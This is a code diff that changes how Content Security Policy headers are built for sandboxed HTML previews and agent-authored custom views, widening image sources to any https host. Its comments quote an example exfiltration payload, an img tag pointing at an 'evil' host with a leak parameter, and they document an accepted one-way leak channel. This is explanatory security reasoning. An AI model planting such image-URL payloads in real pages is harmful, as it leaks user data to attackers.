@@ -36,8 +36,9 @@ export const HTML_PREVIEW_CSP_ALLOWED_CDNS: readonly string[] = [
  * undefined for the `srcdoc` fallback (where `'self'` is meaningless
  * either way and there are no same-origin refs to resolve).
  */
-function buildCsp(connectSrc: string, imgSelf: string, cdns: readonly string[]): string {
+function buildCsp(connectSrc: string, imgSelf: string, cdns: readonly string[], extraImgSrc = ""): string {
   const cdnList = cdns.join(" ");
+  const imgExtra = extraImgSrc ? ` ${extraImgSrc}` : "";
   return [
     "default-src 'none'",
     // LLM-authored HTML almost always uses inline <script> blocks
@@ -48,12 +49,13 @@ function buildCsp(connectSrc: string, imgSelf: string, cdns: readonly string[]):
     `font-src ${cdnList}`,
     // Images: same-origin (workspace files via /api/files/raw), CDN
     // whitelist, plus data: and blob: for inline PNGs and dynamically-
-    // generated charts. Wildcard is deliberately avoided — an attacker
+    // generated charts. Wildcard is deliberately avoided here — an attacker
     // who plants an <img src="https://evil/?leak="> in preview HTML
     // could exfiltrate data via image requests even with connect-src
     // blocked. Widen via HTML_PREVIEW_CSP_ALLOWED_CDNS if LLM output
-    // legitimately needs more hosts.
-    `img-src ${imgSelf} ${cdnList} data: blob:`,
+    // legitimately needs more hosts. `extraImgSrc` lets a specific caller
+    // (custom views) opt into a broader source set — see buildCustomViewCsp.
+    `img-src ${imgSelf} ${cdnList} data: blob:${imgExtra}`,
     `connect-src ${connectSrc}`,
   ].join("; ");
 }
@@ -76,21 +78,32 @@ export function buildHtmlPreviewCsp(origin?: string, cdns: readonly string[] = H
  *     matters: fetch / XHR / WebSocket / sendBeacon / EventSource to an
  *     arbitrary host is what lets a malicious view stream the token/data out.
  *     Locked to the origin, the view can reach ONLY its own data endpoint.
- *   - **Resource loads (`script`/`style`/`font`/`img`) reuse the curated CDN
- *     allowlist.** A `<… src="https://cdn/x?token">` request does reach that
- *     host, but the allowlist is reputable infrastructure (jsdelivr / unpkg /
- *     cdnjs / Google Fonts / plotly) that does NOT expose per-request logs to
- *     third parties, so the token lands in the CDN's logs, never an attacker's.
- *     The allowlist-exfil bypass needs an attacker-CONTROLLABLE allowed host
- *     (open redirect, logging endpoint, attacker subdomain); none here qualify.
- *     This also lets views use charting libs (Chart.js, Plotly, D3) from a CDN.
+ *   - **Script / style / font loads reuse the curated CDN allowlist.** A
+ *     `<… src="https://cdn/x?token">` request does reach that host, but the
+ *     allowlist is reputable infrastructure (jsdelivr / unpkg / cdnjs / Google
+ *     Fonts / plotly) that does NOT expose per-request logs to third parties,
+ *     so the token lands in the CDN's logs, never an attacker's. The
+ *     allowlist-exfil bypass needs an attacker-CONTROLLABLE allowed host (open
+ *     redirect, logging endpoint, attacker subdomain); none here qualify. This
+ *     also lets views use charting libs (Chart.js, Plotly, D3) from a CDN.
+ *   - **`img-src` additionally allows any `https:` host.** Feed/collection
+ *     records routinely carry external image URLs (e.g. an RSS feed's article
+ *     thumbnails), and a view must be able to render them. This re-admits a
+ *     limited, ONE-WAY exfiltration channel — a compromised view could encode
+ *     record data into an `<img src="https://evil/?leak=…">` URL — which the
+ *     `connect-src` lock alone does not close. We accept it: the views are
+ *     authored by the user's own agent over the user's own data, the channel is
+ *     GET-only and URL-length-bounded (no response is readable), and `fetch` /
+ *     XHR / WebSocket / beacon stay origin-locked, so bulk/bidirectional exfil
+ *     is still blocked. If you need the strict guarantee back, proxy images
+ *     through the origin instead of widening `img-src`.
  *
  * `origin` MUST be the explicit server origin: the sandboxed iframe has an
  * opaque origin, so `'self'` would never match (same reason the preview policy
  * substitutes the origin into `img-src`).
  */
 export function buildCustomViewCsp(origin: string, cdns: readonly string[] = HTML_PREVIEW_CSP_ALLOWED_CDNS): string {
-  return buildCsp(origin, origin, cdns);
+  return buildCsp(origin, origin, cdns, "https:");
 }
 
 /**
